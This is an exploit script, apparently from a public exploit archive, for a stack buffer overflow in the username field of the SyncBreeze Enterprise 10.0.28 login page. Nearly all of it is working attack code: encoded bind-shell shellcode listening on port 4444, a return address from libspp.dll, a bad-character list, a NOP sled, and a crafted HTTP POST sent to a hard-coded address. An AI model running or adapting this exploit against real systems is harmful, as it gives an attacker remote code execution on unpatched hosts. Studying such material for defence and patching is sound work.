# Exploit Title: [SyncBreeze POST username overflow]
# Date: [30-Sep-2017]
# Exploit Author: [Owais Mehtab]
# Vendor Homepage: [http://www.syncbreeze.com]
# Software Link: [http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe]
# Version: [10.0.28]
# Tested on: [Windows 7]

#!/usr/bin/python
import socket
import os
import sys

crash = "A" * 1000
# jmp = 10 09 0c 83 libspp.dll
# bad char = 00 0A 0D 25 26 2B 3D

#bind shell on port 4444
buf =  b""
buf += b"\xba\x30\xad\xbe\xc6\xdb\xd6\xd9\x74\x24\xf4\x5d"
buf += b"\x29\xc9\xb1\x52\x83\xed\xfc\x31\x55\x0e\x03\x65"
buf += b"\xa3\x5c\x33\x79\x53\x22\xbc\x81\xa4\x43\x34\x64"
buf += b"\x95\x43\x22\xed\x86\x73\x20\xa3\x2a\xff\x64\x57"
buf += b"\xb8\x8d\xa0\x58\x09\x3b\x97\x57\x8a\x10\xeb\xf6"
buf += b"\x08\x6b\x38\xd8\x31\xa4\x4d\x19\x75\xd9\xbc\x4b"
buf += b"\x2e\x95\x13\x7b\x5b\xe3\xaf\xf0\x17\xe5\xb7\xe5"
buf += b"\xe0\x04\x99\xb8\x7b\x5f\x39\x3b\xaf\xeb\x70\x23"
buf += b"\xac\xd6\xcb\xd8\x06\xac\xcd\x08\x57\x4d\x61\x75"
buf += b"\x57\xbc\x7b\xb2\x50\x5f\x0e\xca\xa2\xe2\x09\x09"
buf += b"\xd8\x38\x9f\x89\x7a\xca\x07\x75\x7a\x1f\xd1\xfe"
buf += b"\x70\xd4\x95\x58\x95\xeb\x7a\xd3\xa1\x60\x7d\x33"
buf += b"\x20\x32\x5a\x97\x68\xe0\xc3\x8e\xd4\x47\xfb\xd0"
buf += b"\xb6\x38\x59\x9b\x5b\x2c\xd0\xc6\x33\x81\xd9\xf8"
buf += b"\xc3\x8d\x6a\x8b\xf1\x12\xc1\x03\xba\xdb\xcf\xd4"
buf += b"\xbd\xf1\xa8\x4a\x40\xfa\xc8\x43\x87\xae\x98\xfb"
buf += b"\x2e\xcf\x72\xfb\xcf\x1a\xd4\xab\x7f\xf5\x95\x1b"
buf += b"\xc0\xa5\x7d\x71\xcf\x9a\x9e\x7a\x05\xb3\x35\x81"
buf += b"\xce\x7c\x61\xa4\xd1\x15\x70\xb6\xec\x5e\xfd\x50"
buf += b"\x84\xb0\xa8\xcb\x31\x28\xf1\x87\xa0\xb5\x2f\xe2"
buf += b"\xe3\x3e\xdc\x13\xad\xb6\xa9\x07\x5a\x37\xe4\x75"
buf += b"\xcd\x48\xd2\x11\x91\xdb\xb9\xe1\xdc\xc7\x15\xb6"
buf += b"\x89\x36\x6c\x52\x24\x60\xc6\x40\xb5\xf4\x21\xc0"
buf += b"\x62\xc5\xac\xc9\xe7\x71\x8b\xd9\x31\x79\x97\x8d"
buf += b"\xed\x2c\x41\x7b\x48\x87\x23\xd5\x02\x74\xea\xb1"
buf += b"\xd3\xb6\x2d\xc7\xdb\x92\xdb\x27\x6d\x4b\x9a\x58"
buf += b"\x42\x1b\x2a\x21\xbe\xbb\xd5\xf8\x7a\xdb\x37\x28"
buf += b"\x77\x74\xee\xb9\x3a\x19\x11\x14\x78\x24\x92\x9c"
buf += b"\x01\xd3\x8a\xd5\x04\x9f\x0c\x06\x75\xb0\xf8\x28"
buf += b"\x2a\xb1\x28"



crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90"*16 + str(buf) #Here is not needed to increase the buffer

fuzz="username="+crash+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.187.10\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.211.149/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(fuzz))+"\r\n"
buffer+="\r\n"
buffer+=fuzz

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.187.10", 80))
expl.send(bytes(buffer, "latin-1"))
expl.close()
